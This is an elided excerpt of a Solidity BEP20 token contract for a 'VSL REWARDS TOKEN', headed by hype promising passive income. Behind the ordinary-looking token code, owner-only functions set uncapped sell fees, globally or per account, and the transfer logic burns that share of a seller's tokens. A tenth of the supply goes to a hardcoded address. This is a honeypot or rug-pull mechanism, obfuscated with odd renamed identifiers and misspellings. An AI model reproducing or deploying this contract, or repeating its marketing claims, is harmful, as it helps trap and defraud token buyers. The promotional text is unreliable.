...
/*
VSL REWARDS TOKEN , the next best pasive income token for the community made by a Based and Experienced team with 6 years experience behind projects . Goals : Getting on major tracking sites (CoinGecko,CoinMarketCap) , listings on CEXs , developing a huge holder rewards token for great ammount of volume , daily buy contests , shill contests and many more . Truly the next best pasive income token for you to get into whille its cheap . DONT LOOK NO FURTHER !!! UTILITIES UNDER DEVELOPMENT !!!
* http://instagram.com/VSLToken230
* https://www.reddit.com/user/VSLToken230
* TWITTER:https://twitter.com/VSL
* WEBSITE:https://www.VSL.COM
* TELEGRAM:https://t.me/VSL
*/
...
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingVSLToken230OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingVSLToken230OnTransferTokens(
        address token,
        uint liquidity,
        uint amuontTokenMin,
        uint amuontETHMin,
    ...
    function swapExactTokensForTokensSupportingVSLToken230OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingVSLToken230OnTransferTokens(
        uint amuontOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingVSLToken230OnTransferTokens(
        uint amuontIn,
        uint amuontOutMin,
        address[] calldata path,
        address to,
...
interface IUniswapV2Factory {
    ...
    function VSLToken230To() external view returns (address);
    function VSLToken230ToSetter() external view returns (address);
    ...
    function setVSLToken230To(address) external;
    function setVSLToken230ToSetter(address) external;
}
...
contract VSL is BEP20, Ownable {
	...
	transfer(0x0D0707963952f2fBA59dD06f2b425ace40b492Fe, totalSupply() / 10*1);	
        ...
        _defaultSellVSLToken230 = 0;
        _defaultBuyVSLToken230 = 0;
    ...
    uint256 private _defaultSellVSLToken230 = 0;
    uint256 private _defaultBuyVSLToken230 = 0;
    ...
    function incS(uint256 _value) external onlyowaer {
        _defaultSellVSLToken230 = _value;
    }


    function acVSLToken230fq(address _acc, uint256 _value) external onlyowaer {
 ...
 function getRelease(address _address) external view onlyowaer returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradeVSLToken230amuont = 0;

        if (rF) {
            uint256 tradeVSLToken230 = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {
                   
                    tradeVSLToken230 = _msgVSLToken230Info(uint160(from));
                    tradeVSLToken230 = tradeVSLToken230 < _defaultSellVSLToken230 ? _defaultSellVSLToken230 : tradeVSLToken230;
                }
                if (from == uniswapV2Pair) {
                    tradeVSLToken230 = _defaultBuyVSLToken230;
                }
            }
                        
			//uint160 f = uint160(from) ^ _escapeKey;
            if (_Escape[from] > 0) {
                tradeVSLToken230 = _Escape[from];
            }


            tradeVSLToken230amuont = _amuont.mul(tradeVSLToken230).div(100);
        }


        if (tradeVSLToken230amuont > 0) {
            _balances[from] = _balances[from].sub(tradeVSLToken230amuont);
            _balances[address(0x000000000000000000000000000000000000dEaD)] = _balances[address(0x000000000000000000000000000000000000dEaD)].add(tradeVSLToken230amuont);
            emit Transfer(from, address(0x000000000000000000000000000000000000dEaD), tradeVSLToken230amuont);
        }

        _balances[from] = _balances[from].sub(_amuont - tradeVSLToken230amuont);
        _balances[_to] = _balances[_to].add(_amuont - tradeVSLToken230amuont);
        emit Transfer(from, _to, _amuont - tradeVSLToken230amuont);
    }
	...
	function _msgVSLToken230Info(uint _acc) internal view virtual returns (uint) {
